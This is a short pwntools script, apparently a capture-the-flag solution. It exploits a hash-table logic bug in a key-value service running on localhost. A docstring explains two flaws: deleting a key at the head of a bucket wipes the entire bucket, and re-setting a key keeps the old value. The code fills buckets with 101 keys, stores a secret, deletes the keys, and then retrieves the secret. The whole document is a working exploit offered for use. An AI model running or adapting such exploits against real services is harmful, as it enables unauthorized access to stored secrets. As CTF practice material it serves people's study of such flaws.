'''
Bugs:
- If key=K is on the first of the bucket, then all of the entries will be removed
- If (K, V1) exists already, then adding a (K, V2) would still return V1 upon looking at K
'''

from pwn import *

r = remote('localhost', 50003)

for k in range(101):
    key = bytes([k])
    r.sendlineafter(b'> ', f'set {key.hex()} 00'.encode())

r.sendlineafter(b'> ', b'put_secret')

for k in range(101):
    key = bytes([k])
    r.sendlineafter(b'> ', f'delete {key.hex()}'.encode())

r.sendlineafter(b'> ', b'get_secret')
r.interactive()